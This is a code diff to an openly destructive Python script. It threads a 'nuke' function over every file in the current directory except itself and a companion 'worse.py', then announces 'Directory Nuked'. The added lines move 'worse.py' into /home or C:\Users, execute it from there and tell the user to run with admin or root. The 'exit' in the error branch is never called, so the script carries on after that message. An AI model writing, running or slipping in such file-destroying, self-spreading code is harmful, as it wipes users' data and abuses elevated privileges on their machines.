@@ -1,7 +1,28 @@
 import os
+import subprocess
+import shutil
 from concurrent.futures import ThreadPoolExecutor
 
 flist = []
+try:
+    if os.name == 'posix':
+        source = os.path.expanduser("~/bad/worse.py")
+        destination = "/home/worse.py"
+   
+
+    elif os.name == 'nt':
+        source = os.path.expanduser(r"~\bad\worse.py")
+        destination = r"C:\Users"
+
+    shutil.move(source, destination)
+    subprocess.run(
+        ["python3", "worse.py"],
+        cwd=destination
+    )
+except PermissionError:
+    print("Run the script with admin or root")
+    exit
+
 
 for f in os.listdir():
     if f == "worse.py" or f == "bad.py":
@@ -23,4 +44,4 @@ def nuke(i):
         
 with ThreadPoolExecutor(max_workers=24) as executor:
     executor.map(nuke, flist)
-print('Directory has been nuked')
+print('Directory Nuked')
